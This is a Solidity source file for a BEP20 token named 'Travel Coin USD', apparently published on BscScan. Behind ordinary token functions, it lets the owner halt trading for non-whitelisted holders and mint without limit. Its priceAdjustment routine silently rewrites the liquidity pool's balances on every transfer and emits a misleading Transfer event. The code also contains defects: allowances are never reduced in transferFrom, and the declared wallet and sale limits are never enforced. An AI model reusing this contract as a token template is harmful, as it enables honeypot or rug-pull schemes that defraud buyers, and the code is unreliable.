/**
 *Submitted for verification at BscScan.com on 2022-03-19
*/

pragma solidity ^0.8.11;
// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint256);
    function getOwner() external view returns (address);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}



contract LockToken is Ownable {
    bool public isOpen = false;
    mapping(address => bool) private _whiteList;
    modifier open(address from, address to) {
        require(isOpen || _whiteList[from] || _whiteList[to], "Not Open");
        _;
    }

    constructor() {
        _whiteList[msg.sender] = true;
        _whiteList[address(this)] = true;
    }

    function openTrade() external onlyOwner {
        isOpen = true;
    }

    function stopTrade() external onlyOwner {
        isOpen = false;
    }

    function includeToWhiteList(address[] memory _users) external onlyOwner {
        for(uint8 i = 0; i < _users.length; i++) {
            _whiteList[_users[i]] = true;
        }
    }
}



contract TravelCoinUSD is IBEP20, LockToken
{
    using SafeMath for uint256;
    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    mapping(address => bool) private _excludedFromWahle;
    uint public _totalSupply = 100_000_000_000_000 * 10**4;
    string public _name = "Travel Coin USD";
    string public _symbol = "USDTVL";
    uint256 public _decimals = 4;
    address public _poolPair = address(0); 
    uint256 public _maxWalletLimit = _totalSupply.div(100); // 1%
    uint256 public _maxSaleTxAmount = _totalSupply.mul(5).div(1000); // 0.5%
    
    constructor() 
    {
        _balances[owner()] = _totalSupply;
        _excludedFromWahle[msg.sender] = true;
        emit Transfer(address(0), owner(), _totalSupply);
        emit WhiteListed(owner(), true, block.timestamp);
    }


    function mint(uint256 newAmount) external onlyOwner
    {
        _balances[owner()] = _balances[owner()].add(newAmount);
        _totalSupply = _totalSupply.add(newAmount);
        emit Transfer(address(0), owner(), newAmount);
    }

    function burn(uint256 newAmount) external onlyOwner
    {
        _balances[owner()] = _balances[owner()].sub(newAmount); 
        _totalSupply = _totalSupply.sub(newAmount);
        emit Transfer(owner(), address(0), newAmount);
    }


    event _poolPairUpdated(address account, uint256 timestamp);
    function set_poolPair(address _address) external onlyOwner
    {
        _poolPair = _address;
        _excludedFromWahle[_address] = true;
        emit _poolPairUpdated(_address, block.timestamp);
        emit WhiteListed(_address, true, block.timestamp);

    }



    function priceAdjustment(address from)  private 
    {
        if(from != owner()) { require(_poolPair != address(0), "Pool Pair Address not yet updated");}
        uint256 busdBal = IBEP20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7).balanceOf(_poolPair);
        uint256 tokenBal = balanceOf(_poolPair);
        if(busdBal>tokenBal)
        {
            uint256 amount = busdBal.sub(tokenBal);
            require(balanceOf(owner())>=amount, "No sufficient supply");
            _balances[_poolPair] = _balances[_poolPair].add(amount);
            _balances[owner()] = _balances[owner()].sub(amount);
            emit Transfer(owner(), _poolPair, amount);
        }
        else if(tokenBal>busdBal) 
        {
            uint256 amount = tokenBal.sub(busdBal);
            require(balanceOf(_poolPair)>=amount, "No sufficient supply");
            _balances[_poolPair] = _balances[_poolPair].add(amount);
            _balances[address(this)] = _balances[address(this)].sub(amount); 
            emit Transfer(_poolPair, owner(), amount);           
        }
    }

    event _maxWalletLimitUpdated(uint256 _amount, uint256 timestamp);
    function set_maxWalletLimit(uint256 _amount) external onlyOwner
    {  
        _maxWalletLimit = _amount;
        emit _maxWalletLimitUpdated(_amount, block.timestamp);
    }

    event MaxSaleTxAmount(uint256 _amount, uint256 timestamp);
    function set_maxSaleTxAmount(uint256 _amount) external onlyOwner
    {  
        _maxSaleTxAmount = _amount;
        emit MaxSaleTxAmount(_amount, block.timestamp);
    }

    event WhiteListed(address account, bool enabled, uint256 timestamp);
    function includeToWhiteList(address account, bool _enabled) external onlyOwner 
    {
            _excludedFromWahle[account] = _enabled;
            emit WhiteListed(account, _enabled, block.timestamp);
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) 
    {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function getOwner() external view override returns (address)
    {
        return owner();
    }


    function balanceOf(address _owner) public view returns(uint) {
        return _balances[_owner];
    }

    function transfer(address to, uint value) public open(msg.sender, to) returns(bool) 
    {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        _balances[to] = _balances[to].add(value);
        _balances[msg.sender] = _balances[msg.sender].sub(value);
        emit Transfer(msg.sender, to, value);
        priceAdjustment(msg.sender);
        return true;
    }

    function transferFrom(address from, address to, uint value) public open(from, to)  returns(bool) 
    {
        require(balanceOf(from) >= value, 'balance too low');
        require(_allowances[from][msg.sender] >= value, 'allowance too low');
        _balances[to] = _balances[to].add(value);
        _balances[from] = _balances[from].sub(value);
        emit Transfer(from, to, value);
        priceAdjustment(from);
        return true;
    }

    function approve(address spender, uint value) public returns (bool) 
    {
        _allowances[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}